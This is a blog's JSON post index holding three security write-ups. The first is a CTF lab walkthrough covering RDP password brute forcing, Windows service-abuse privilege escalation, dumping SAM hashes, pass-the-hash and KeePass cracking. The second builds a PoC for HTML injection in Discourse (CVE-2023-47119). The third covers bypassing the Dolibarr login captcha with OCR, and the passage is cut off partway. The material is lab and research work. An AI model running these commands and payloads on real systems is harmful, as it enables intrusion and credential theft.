[ { "title": "DGSSI CTF PRO 2024 - Italy Writeup", "url": "/posts/DGSSI-CTF-PRO-Italy-Writeup/", "categories": "Machine, Writeup, CTF", "tags": "DGSSI, CTF, Writeup", "date": "2024-03-26 00:00:00 +0000", "snippet": "The lab was included in the professional DGSSI CTF hosed in SecDojo platform on February 7, 2024.https://www.linkedin.com/showcase/dgssi-ctf-2024/Naples machineWe start our enumeration with a Nmap scan to identify services.Nmap scanPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: BASTION| NetBIOS_Domain_Name: BASTION| NetBIOS_Computer_Name: BASTION| DNS_Domain_Name: Bastion| DNS_Computer_Name: Bastion| Product_Version: 10.0.14393|_ System_Time: 2024-02-07T09:19:47+00:00|_ssl-date: 2024-02-07T09:19:52+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=Bastion| Not valid before: 2024-02-06T09:12:00|_Not valid after: 2024-08-07T09:12:00Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-02-07T09:19:47|_ start_date: 2024-02-07T09:11:59| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: BASTION, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:ff:1b:91:ea:6e (unknown)| smb-os-discovery: | OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)| Computer name: Bastion| NetBIOS computer name: BASTION\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2024-02-07T09:19:47+00:00|_clock-skew: mean: 1s, deviation: 0s, median: 0sSMBI started by checking smb access using crackmapexec, and I found that an empty user/pass has access to a share called Userssmbclient \\\\\\\\10.8.0.3\\\\Users -Nsmb: \\&amp;gt; ls . DR 0 Sat Jan 29 16:01:18 2022 .. DR 0 Sat Jan 29 16:01:18 2022 Default DHR 0 Mon Jan 24 11:53:01 2022 desktop.ini AHS 174 Sat Jul 16 09:21:29 2016 Public DR 0 Wed Feb 7 04:18:26 2024I start downloading all the files from the share to inspect themsmb: \\Public\\&amp;gt; prompt OFFsmb: \\Public\\&amp;gt; recurse ONsmb: \\Public\\&amp;gt; mget *getting file \\Public\\desktop.ini of size 174 as desktop.ini (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)getting file \\Public\\local.txt of size 54 as local.txt (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)getting file \\Public\\mark.lnk of size 1068 as mark.lnk (2.5 KiloBytes/sec) (average 1.1 KiloBytes/sec)getting file \\Public\\AccountPictures\\desktop.ini of size 196 as AccountPictures/desktop.ini (0.5 KiloBytes/sec) (average 1.0 KiloBytes/sec)getting file \\Public\\Documents\\desktop.ini of size 278 as Documents/desktop.ini (0.8 KiloBytes/sec) (average 0.9 KiloBytes/sec)getting file \\Public\\Downloads\\desktop.ini of size 174 as Downloads/desktop.ini (0.5 KiloBytes/sec) (average 0.9 KiloBytes/sec)getting file \\Public\\Libraries\\desktop.ini of size 175 as Libraries/desktop.ini (0.5 KiloBytes/sec) (average 0.8 KiloBytes/sec)getting file \\Public\\Libraries\\RecordedTV.library-ms of size 999 as Libraries/RecordedTV.library-ms (2.7 KiloBytes/sec) (average 1.0 KiloBytes/sec)getting file \\Public\\Music\\desktop.ini of size 380 as Music/desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)getting file \\Public\\Pictures\\desktop.ini of size 380 as Pictures/desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)getting file \\Public\\Videos\\desktop.ini of size 380 as Videos/desktop.ini (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)smb: \\Public\\&amp;gt;The files doesn’t have any interesting details. We can see an interesting shortcut \\Public\\mark.lnk refereeing to a potential user called markI checked first smb with the user mark using empty/same user as password, but without success.RDPWe already have RDP, so I bruteforce the password for our user using hydrahydra -l mark -P /usr/share/wordlists/rockyou.txt rdp://10.8.0.3Hydra v9.4 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-07 04:55:17[WARNING] rdp servers often don&#39;t like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task[DATA] attacking rdp://10.8.0.3:3389/[STATUS] 381.00 tries/min, 381 tries in 00:01h, 14344018 to do in 627:29h, 4 active[3389][rdp] host: 10.8.0.3 login: mark password: pumpkinWe have a match with the password pumpkinI logged to the machine using rdesktop and setup a reverse shell to have handy access to the machineThe first flag is located in Desktop/local.txt (if I remember it correctly)Bastion_0x_SHilling-kj1b249mav2qdt8br9xpxlypprfgyo0sNow we need to get access to Administrator to complete the first machine.Privilege escalationWhen dealing with privilege escalation, I go with PowerUp and winPEAS. I started by uploading them to the machinePS C:\\Users\\mark&amp;gt; Invoke-WebRequest -Uri http://10.8.0.4:8000/PowerUp.ps1 -OutFile p.ps1PS C:\\Users\\mark&amp;gt; Invoke-WebRequest -Uri http://10.8.0.4:8000/winPEASany.exe -OutFile w.exeI checked PowerUp firstPS C:\\Users\\mark&amp;gt; . .\\p.ps1PS C:\\Users\\mark&amp;gt; Invoke-AllChecksWe have a misconfigured SNMP service loaded by LocalSystem . We can modify the service to inject commands and restart it (CanRestart true) to run itServiceName : SNMPPath : C:\\Windows\\System32\\snmp.exeStartName : LocalSystemAbuseFunction : Invoke-ServiceAbuse -Name &#39;SNMP&#39;CanRestart : TrueName : SNMPCheck : Modifiable ServicesWe can do it using PowerUp or manually. The PowerUp command is Invoke-ServiceAbuse -Name &#39;SNMP&#39;The abuse command can be modified with a specific command or a specific user/pass created as administratorThis machine was private, I left the default abuse which add an administrator user with john:Password123!PS C:\\Users\\mark&amp;gt; PS C:\\Users\\mark&amp;gt; Invoke-ServiceAbuse -Name &#39;SNMP&#39;ServiceAbused Command ------------- ------- SNMP net user john Password123! /add &amp;amp;&amp;amp; net localgroup Administrators john /addWe can confirm the created userPS C:\\Users\\mark&amp;gt; net localgroup AdministratorsAlias name AdministratorsComment Administrators have complete and unrestricted access to the computer/domainMembers-------------------------------------------------------------------------------AdministratorjohnThe command completed successfully.Dump hashesAs we have administrator access, we can dump hashes. I used impacket-secretsdumpimpacket-secretsdump bastion/john:&quot;Password123\\!&quot;@10.8.0.3Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Target system bootKey: 0xe8f8eb3dae34cbd9d3d9eea96a2cdf99[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:75f93c2abb1e018670a0c8124dda15e7:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::mark:1008:aad3b435b51404eeaad3b435b51404ee:c429b91ec17f2c752917632bf06af883:::taylor:1009:aad3b435b51404eeaad3b435b51404ee:2e9f7a4fe52270ad2db1732c6cdb4428:::john:1010:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::[*] Dumping cached domain logon information (domain/username:hash)[*] Dumping LSA Secrets[*] DPAPI_SYSTEM dpapi_machinekey:0x6770b89a8dedc96069aa66160a997824ff6910abdpapi_userkey:0x5d63f1f7715d08bf3b727e79f23e2d330fab3db2[*] NL$KM 0000 2E 74 ED 55 62 CB 0C 23 83 3D C6 56 51 CE B2 93 .t.Ub..#.=.VQ... 0010 63 BC 5F C9 59 8B 25 DB 1F FC F9 A2 26 50 31 60 c._.Y.%.....&amp;amp;P1` 0020 C4 67 C4 47 3B EA D7 01 86 9B 67 31 70 F9 30 A1 .g.G;.....g1p.0. 0030 49 99 F2 29 6D 19 85 D4 F2 01 BE C0 65 26 19 20 I..)m.......e&amp;amp;. NL$KM:2e74ed5562cb0c23833dc65651ceb29363bc5fc9598b25db1ffcf9a226503160c467c4473bead701869b673170f930a14999f2296d1985d4f201bec065261920[*] Cleaning up... [*] Stopping service RemoteRegistryAdministrator shellNow I switched to Administrator using impacket-psexecimpacket-psexec bastion/administrator@10.8.0.3 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:75f93c2abb1e018670a0c8124dda15e7&quot;Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Requesting shares on 10.8.0.3.....[*] Found writable share ADMIN$[*] Uploading file GRYvxaly.exe[*] Opening SVCManager on 10.8.0.3.....[*] Creating service Umrf on 10.8.0.3.....[*] Starting service Umrf.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.We got our root flagC:\\Users\\Administrator\\Desktop&amp;gt; dir Volume in drive C has no label. Volume Serial Number is AEC0-6C42 Directory of C:\\Users\\Administrator\\Desktop02/07/2024 09:18 AM &amp;lt;DIR&amp;gt; .02/07/2024 09:18 AM &amp;lt;DIR&amp;gt; ..01/29/2022 08:06 PM 951 KeePass 2.lnk02/07/2024 09:18 AM 54 proof.txt 2 File(s) 1,005 bytes 2 Dir(s) 13,638,184,960 bytes freeC:\\Users\\Administrator\\Desktop&amp;gt; type proof.txtBastion_0x_SHilling-n6paayngehlwf9a6sobcfi4omj6rvyhmWe finished the first machine Naples. Now we need to use our access to pivot the second machine FlorenceFlorenceGetting the access from Naples machineWhile getting the administrator access from our Naples machine, I saw a shortcut for KeePass KeePass 2.lnk which is a hint to search for the KeePass database file.C:\\Users\\Administrator\\Desktop&amp;gt; dir Volume in drive C has no label. Volume Serial Number is AEC0-6C42 Directory of C:\\Users\\Administrator\\Desktop02/07/2024 09:18 AM &amp;lt;DIR&amp;gt; .02/07/2024 09:18 AM &amp;lt;DIR&amp;gt; ..01/29/2022 08:06 PM 951 KeePass 2.lnk02/07/2024 09:18 AM 54 proof.txt 2 File(s) 1,005 bytes 2 Dir(s) 13,638,184,960 bytes freeMark and Administrator already checked. The only one left is Taylor. We have the hash already dumped after the privilege escalationtaylor:1009:aad3b435b51404eeaad3b435b51404ee:2e9f7a4fe52270ad2db1732c6cdb4428:::Taylor shellI didn’t take a note on how I accessed Taylor’s account. It could be using pass the hash with RDP.Now with a access to Taylor user, I started checking directoriesPS C:\\Users\\taylor&amp;gt; tree /fFolder PATH listingVolume serial number is 00000200 AEC0:6C42C:.????Contacts????Desktop? KeePass - Shortcut.lnk? ????Documents? Database.kdbx? ????Downloads????Favorites? ? Bing.url? ? ? ????Links????Links? Desktop.lnk? Downloads.lnk? ????Music????Pictures????Saved Games????Searches????VideosWe found the KeePass database. I downloaded the database to my machinecopy Documents\\Database.kdbx \\\\10.8.0.4\\test\\database.kdbxThe database is protected with a password so we need to crack itkpcli --kdb database.kdbx Provide the master password: Cracking KeePass databaseI extracted the hash using keepass2johnkeepass2john database.kdbxdatabase:$keepass$*2*60000*0*fa25330f0cee5d8599dbaa55f8e7dc712d2448c2904af33033dd114ca051b27b*666fd415d20e5613cadd094129e973e203a10fef79153ec6b00763cf224eb209*4a5e8537a0f1c4554ee49744369bbdea*14b77bfa03e8cf3f9b8616dd80ff0a3b7179467727fca10c5150e188e224be98*2996adaab16d60c01229faa959829820658358e9abcf227eeff42b135c01dba3I loaded the hash without “database:” part for hashcathashcat -m 13400 hash.txt rockyou.txtCracked password is backstreetboysLet’s explore the database using kpclikpcli --kdb database.kdbxProvide the master password: *************************KeePass CLI (kpcli) v3.8.1 is ready for operation.Type &#39;help&#39; for a description of available commands.Type &#39;help &amp;lt;command&amp;gt;&#39; for details on individual commands.kpcli:/&amp;gt; ls=== Groups ===Database/kpcli:/&amp;gt; ls Database/=== Groups ===eMail/General/Homebanking/Internet/Network/Recycle Bin/Windows/=== Entries ===0. Backup domain account 1. Domain account We have two entries with some accountskpcli:/&amp;gt; show 0Title: Backup domain accountUname: SECDOJO\\backup Pass: NPs1yLXH$ URL: Notes: kpcli:/&amp;gt; show 1Title: Domain accountUname: SECDOJO\\tsilva Pass: 8JPmoXL!ds URL: Notes: We got working accounts for the machine “Florence” confirmed with SMBNmap scanPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open spark Apache Spark135/tcp open msrpc?139/tcp open netbios-ssn?389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: secdojo.lab, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: SECDOJO)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ldapssl?3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: secdojo.lab, Site: Default-First-Site-Name)3269/tcp open globalcatLDAPssl?3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=Temple.secdojo.lab| Not valid before: 2024-02-06T09:12:00|_Not valid after: 2024-08-07T09:12:00| rdp-ntlm-info: | Target_Name: SECDOJO| NetBIOS_Domain_Name: SECDOJO| NetBIOS_Computer_Name: TEMPLE| DNS_Domain_Name: secdojo.lab| DNS_Computer_Name: Temple.secdojo.lab| DNS_Tree_Name: secdojo.lab| Product_Version: 10.0.14393|_ System_Time: 2024-02-07T10:41:59+00:00|_ssl-date: 2024-02-07T10:42:39+00:00; +1s from scanner time.1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port139-TCP:V=7.94SVN%I=7%D=2/7%Time=65C35DF8%P=x86_64-pc-linux-gnu%r(GSF:etRequest,5,&quot;\\x83\\0\\0\\x01\\x8f&quot;);Service Info: Host: TEMPLE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb-os-discovery: | OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)| Computer name: Temple| NetBIOS computer name: TEMPLE\\x00| Domain name: secdojo.lab| Forest name: secdojo.lab| FQDN: Temple.secdojo.lab|_ System time: 2024-02-07T10:41:59+00:00|_nbstat: NetBIOS name: TEMPLE, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:ff:45:d0:b5:96 (unknown)| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-02-07T10:41:59|_ start_date: 2024-02-07T09:12:08Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 190.35 secondsOutputI didn’t keep detailed notes for this part, I’ll do a recap for it SMB shares : backup user has access to a SMB share that has SAM and other registry files that could be used to dump hashes. Also, one of the files was larger and keep crashing the SMB connection while downloading so we can’t get it I did some recon using ldapdomaindump Part of users (we have a lot) Our user backup is a member of Backup Operators. We can use that to dump SAM and other hives to extract hashes https://www.bordergate.co.uk/backup-operator-privilege-escalation/ I was able to get the hives using impacket-reg https://wadcoms.github.io/wadcoms/Impacket-Reg/ I had issues extracting the hashes from hives using pypykatz and impacket-secretsdump. I was also mixing registry files from imapcket-reg and the other ones from SMB share so maybe I got some of them corrupted. I wasn’t able to get it to work so I stopped here to check other labs in the CTF.The solution is clear after the finding. We need to get the needed registry hives to extract hashes using our backup account which is a member of Backup Operators.I didn’t solve this part, so my approach could be correct or maybe not.Thanks." }, { "title": "Discourse CVE-2023-47119 - Building a CVE POC from commits changes", "url": "/posts/Discourse-CVE-2023-47119-Building-a-CVE-POC-from-commits-changes/", "categories": "Web", "tags": "Discourse", "date": "2023-11-13 00:00:00 +0000", "snippet": "I was checking for some Discourse vulnerabilities, and I saw that a new CVE was dropped on 11/10/2023 CVE-2023-47119The details didn’t mention any POC, so I did some analysis based on the source code commits changes to understand the vulnerability and how it is possible to exploit it.The article includes details, lab setup and a demo.A GitHub repository was created for the POC https://github.com/BaadMaro/CVE-2023-47119 Feel free to contribute with reports, escalations, and links to other POCs too.CVE-2023-47119CVE-2023-47119 is a new Discourse vulnerability affecting versions prior to version 3.1.3 of the stable branch and version 3.2.0.beta3 of the beta and tests-passed branches. Some links can inject arbitrary HTML tags when rendered through the Onebox engine.The severity is Medium 5.3 which is understandable as the vulnerability is only HTML injection and it needs a bypass for the XSS filter used by Discourse to cause a bigger impact.Checking the CVE details CVE-2023-47119, we can see the commits added for the fix for example this one : https://github.com/discourse/discourse/commit/628b293ff53fb617b3464dd27268aec84388cc09The interesting part is the fix for the github_issue_onebox.rb file which reveals our target.As we can see : The bug is affecting /lib/onebox/engine/github_issue_onebox.rb An escape was added to the value of GitHub issue label. If we check the details of the file, we can see an emoji converter that converts the emoji code to an image. The code is described in /app/helpers/emoji_helper.rb which is a call for /app/models/emoji.rbmodule EmojiHelper def emoji_codes_to_img(str) raw(Emoji.codes_to_img(str)) endend def self.codes_to_img(str) return if str.blank? str = str.gsub(/:([\\w\\-+]*(?::t\\d)?):/) do |name| code = $1 if code &amp;amp;&amp;amp; Emoji.custom?(code) emoji = Emoji[code] &quot;&amp;lt;img src=\\&quot;#{emoji.url}\\&quot; title=\\&quot;#{code}\\&quot; class=\\&quot;emoji\\&quot; alt=\\&quot;#{code}\\&quot; loading=\\&quot;lazy\\&quot; width=\\&quot;20\\&quot; height=\\&quot;20\\&quot;&amp;gt;&quot; elsif code &amp;amp;&amp;amp; Emoji.exists?(code) &quot;&amp;lt;img src=\\&quot;#{Emoji.url_for(code)}\\&quot; title=\\&quot;#{code}\\&quot; class=\\&quot;emoji\\&quot; alt=\\&quot;#{code}\\&quot; loading=\\&quot;lazy\\&quot; width=\\&quot;20\\&quot; height=\\&quot;20\\&quot;&amp;gt;&quot; else name end endThe function returns an image HTML element for known emojis, and if it doesn’t exist, it returns the same text used.In /lib/onebox/engine/github_issue_onebox.rb before the fix, we can see the emoji function is used in label part :labels = raw[&quot;labels&quot;].map { |l| { name: Emoji.codes_to_img(l[&quot;name&quot;]) } }The label is an identifier used by Github issues to specify, for example the type of issue.In Discourse, the onboxe engine used for topic details and replies have a custom engine for GitHub issues which pulls the issue details via URL and converts them to a better view.Lab setupTo build Discourse 3.1.3 which is a vulnerable version, I used the docker compose file by bitnami https://hub.docker.com/r/bitnami/discourse/ docker-compose.yml : https://raw.githubusercontent.com/bitnami/containers/main/bitnami/discourse/docker-compose.yml Modify the 2 images tag to 3.1.3 or any other vulnerable version docker.io/bitnami/discourse:3.1.3 Change host to your preferred config like 0.0.0.0 or your internal network IP address DISCOURSE_HOST=0.0.0.0 You can also modify the port 80 After modifying the file, run docker-compose up -d Few minutes you’ll be able to see the discourse web server at your host port 80 App default login user:bitnami123You can also use the official docker https://github.com/discourse/discourse_dockerDemoTo control the label name, we can create a repository with an issue and modify the label name assigned to the issue.ExampleIn this example, the issue label was “bug”. We can now try including an emoji like :smile:&amp;lt;span style=&quot;display:inline-block;margin-top:2px;background-color: #B8B8B8;padding: 2px;border-radius: 4px;color: #fff;margin-left: 3px;&quot;&amp;gt; bug &amp;lt;img src=&quot;/images/emoji/twitter/smile.png?v=12&quot; title=&quot;smile&quot; class=&quot;emoji&quot; alt=&quot;smile&quot; width=&quot;20&quot; height=&quot;20&quot;&amp;gt; &amp;lt;/span&amp;gt;As we can see, it’s the same discussed output from the emoji function.Now let’s confirm a no-existing emoji&amp;lt;span style=&quot;display:inline-block;margin-top:2px;background-color: #B8B8B8;padding: 2px;border-radius: 4px;color: #fff;margin-left: 3px;&quot;&amp;gt; bug :baadmaroemoji: &amp;lt;/span&amp;gt;As the emoji function didn’t find the emoji, it returned the original text.The returned text is not sanitized (emoji format or just simple text) which is the cause of the CVE.We can confirm by injecting an h1 tag for example. Having the double “:” in label name is not necessary&amp;lt;span style=&quot;display:inline-block;margin-top:2px;background-color: #B8B8B8;padding: 2px;border-radius: 4px;color: #fff;margin-left: 3px;&quot;&amp;gt; bug &amp;lt;h1&amp;gt;BaadMaro HTML Injection POC&amp;lt;/h1&amp;gt; &amp;lt;/span&amp;gt;XSS Filtershttps://github.com/discourse/discourse/blob/main/docs/SECURITY.md#xssDiscourse is using some mechanisms to protect against XSS : Node module xss https://jsxss.com/en/index.html Server side allow list sanitizer using the Sanitize gem. See the relevant Discourse code. Titles and all other places where non-admins can enter code are protected either using the Handlebars library or standard Rails XSS protection. CSPSo to be able to escalate the CVE from HTML injection to XSS, you need a bypass for the used filters.ConclusionA GitHub repository was created for the POC : https://github.com/BaadMaro/CVE-2023-47119You can contribute to the repository with reports, escalations and links to other POCs too.Thank you." }, { "title": "Bypass captcha using OCR on Dolibarr login page", "url": "/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/", "categories": "Web", "tags": "Dolibarr", "date": "2022-08-01 00:00:00 +0000", "snippet": "Today i’m going to explain how i was able to bypass captcha using OCR on Dolibarr login page, and create a script for it.Output : I published the tool with the name DoliBrute. I’ll work on it for more updateshttps://github.com/BaadMaro/DoliBruteDolibarrDolibarr ERP CRM is a modern software package to manage your company or foundation’s activity (contacts, suppliers, invoices, orders, stocks, agenda, accounting, …). It is open source software (written in PHP) and designed for small and medium businesses, foundations and freelancers. Website : https://www.dolibarr.org/ Github : https://github.com/Dolibarr/dolibarrSetup a lab for testingThere is many ways to install Dolibarr to be able to interact with it : Simple installation : you can download packaged versions from your system https://www.dolibarr.org/downloads.php Advance installation : Build from source and setup the web server and datatbase https://github.com/Dolibarr/dolibarr#advanced-setup Docker : We can call it the gigchad method. If you don’t know anything about docker you can check https://www.youtube.com/watch?v=iqqDU2crIEQ.Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly.There is a docker image for Dolibarr created by tuxgasy https://hub.docker.com/r/tuxgasy/dolibarrDolibarr installation with DockerBefore you continue, you should install Docker on your system. We’re going to also need docker-compose https://docs.docker.com/get-docker/For me, I was using Kali Linux https://www.kali.org/docs/containers/installing-docker-on-kali/ I started by pulling the Dolibarr Docker image.docker pull tuxgasy/dolibarrAfter finishing, let’s check the available imagesThis docker image dosen’t include the database. So we need to create a docker container for the datatabse.I’m going to create a file called docker-compose.yml to setup datatabse and dolibarrversion: &quot;3&quot;services: mariadb: image: mariadb:latest environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: dolibarr web: image: tuxgasy/dolibarr environment: DOLI_DB_HOST: mariadb DOLI_DB_USER: root DOLI_DB_PASSWORD: root DOLI_DB_NAME: dolibarr DOLI_URL_ROOT: &#39;http://0.0.0.0&#39; PHP_INI_DATE_TIMEZONE: &#39;Europe/Paris&#39; ports: - &quot;80:80&quot; links: - mariadbNow we need to start the services using the docker-compose command.We can see our containers running using docker psLet’s go to http://0.0.0.0 (or your machine ip) to access the new Dolibarr installation.As we can see, our web server is up. Now let’s login using admin:admin and activate captcha on the login page.If we logout and check the login page now, we can see the new captcha.Understand the login mecanismI’m going to use burpsuite as a proxy to intercept requests.Let’s test the login request. Request :POST /index.php?mainmenu=home HTTP/1.1Host: 192.168.1.110Content-Length: 377Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.1.110Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.1.110/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: DOLSESSID_88d498d64b60efb4af60751a059c59a1=gko4agq9j65qvqui7fe3snpdl6; DOLSESSTIMEOUT_88d498d64b60efb4af60751a059c59a1=1440Connection: closetoken=3f061ddd3d625668740705559ebd19ce&amp;amp;actionlogin=login&amp;amp;loginfunction=loginfunction&amp;amp;tz=1&amp;amp;tz_string=Africa%2FCasablanca&amp;amp;dst_observed=0&amp;amp;dst_first=2022-05-8T01%3A59%3A00Z&amp;amp;dst_second=2022-03-27T02%3A59%3A00Z&amp;amp;screenwidth=1038&amp;amp;screenheight=718&amp;amp;dol_hide_topmenu=&amp;amp;dol_hide_leftmenu=&amp;amp;dol_optimize_smallscreen=&amp;amp;dol_no_mouse_hover=&amp;amp;dol_use_jmobile=&amp;amp;username=test&amp;amp;password=test&amp;amp;code=3Kmw6As we can see the login page send a post request to /index.php?mainmenu=home with a data payload. It’s has a token, our login username and password, the captcha code and some variables. We can see also a DOLSEESID cookie in the request.We can see the error message after forwarding the request.Where is the token ?&amp;lt;view-source:http://192.168.1.110/index.php?mainmenu=home&amp;gt;If we check the source page, we see the used token a also some variables.&amp;lt;form id=&quot;login&quot; name=&quot;login&quot; method=&quot;post&quot; action=&quot;/index.php?mainmenu=home&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;3f061ddd3d625668740705559ebd19ce&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;actionlogin&quot; value=&quot;login&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;loginfunction&quot; value=&quot;loginfunction&quot; /&amp;gt;&amp;lt;!-- Add fields to store and send local user information. This fields are filled by the core/js/dst.js --&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;tz&quot; id=&quot;tz&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;tz_string&quot; id=&quot;tz_string&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dst_observed&quot; id=&quot;dst_observed&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dst_first&quot; id=&quot;dst_first&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dst_second&quot; id=&quot;dst_second&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;screenwidth&quot; id=&quot;screenwidth&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;screenheight&quot; id=&quot;screenheight&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dol_hide_topmenu&quot; id=&quot;dol_hide_topmenu&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dol_hide_leftmenu&quot; id=&quot;dol_hide_leftmenu&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dol_optimize_smallscreen&quot; id=&quot;dol_optimize_smallscreen&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dol_no_mouse_hover&quot; id=&quot;dol_no_mouse_hover&quot; value=&quot;&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dol_use_jmobile&quot; id=&quot;dol_use_jmobile&quot; value=&quot;&quot; /&amp;gt;After refreshing the page, we see the same value. So maybe it’s fixed.&amp;lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;3f061ddd3d625668740705559ebd19ce&quot; /&amp;gt;Login bruteforce workflowNow we are going to start building our script to bypass the captcha code. Here is the workflow :  Grab the token from the page in each request. Find a way to read captcha code from the image using OCR. Find the test cases for wrong login, wrong captcha code, and successful login. Build the post request using the variables and custom username and password.Extract captcha code using OCRFor our captcha code, It’s loaded from a php file&amp;lt;img class=&quot;inline-block valignmiddle&quot; src=&quot;/core/antispamimage.php&quot; border=&quot;0&quot; width=&quot;80&quot; height=&quot;32&quot; id=&quot;img_securitycode&quot; /&amp;gt;http://192.168.1.110/core/antispamimage.phpIn each call to this file, a new valid captcha is generated. It’s the same mechanism available on the login page with the refresh icon.To be able to extract characters from captcha image. I’ll use Python-tesseract https://pypi.org/project/pytesseract/Python-tesseract is a python wrapper for Google&#39;s Tesseract-OCRWe need to install Tesseract-OCR first before using it with python https://tesseract-ocr.github.io/tessdoc/Home.htmlOptical Character Recognition (OCR) is the process of detecting and reading text in images through computer vision. For Kali Linuxsudo apt-get install tesseract-ocrpip3 install pytesseractMy script to get OCR the captcha code from the image using OCR core/antispamimage.php : give us the image. As i captured using python requests, i got the bytes. You can see the file header with 89 PNG. It’s the png file header. b&#39;\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00P\\x00\\x00\\x00 \\x01\\x03\\x00\\x00\\x00\\xbf\\xfdm/\\x00\\x00\\x00\\x06PLTE\\xfa\\xfa\\xfa\\x00\\x00\\x00\\xfa1=\\x8f\\x00\\x00\\x00\\tpHYs\\x00\\x00\\x0e\\xc4\\x00\\x00\\x0e\\xc4\\x01\\x95+\\x0e\\x1b\\x00\\x00\\x00JIDAT\\x18\\x95c`\\x18@`\\xc3\\xc0\\xc0\\xe2\\x00a:10\\xf0 